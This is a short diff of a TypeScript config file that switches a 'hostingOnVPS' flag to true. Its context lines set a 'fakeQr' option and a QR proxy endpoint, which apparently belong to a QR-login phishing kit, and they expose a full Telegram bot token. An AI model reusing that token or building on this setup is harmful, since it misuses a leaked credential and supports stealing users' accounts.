@@ -4,7 +4,7 @@ export const fullDomain = `https://${domain}`;
 export const proxies: string[] = [];
 export const fakeQr = true;
 export const qrCodeEndpoint = 'localhost:8080/proxy';
-export const hostingOnVPS = false;
+export const hostingOnVPS = true;
 
 // TELEGRAM DETAILS
 export const telegramToken = '6529370298:AAF6qOaZBC3TZwj07yOoyYlqs22RDKmdqUU';
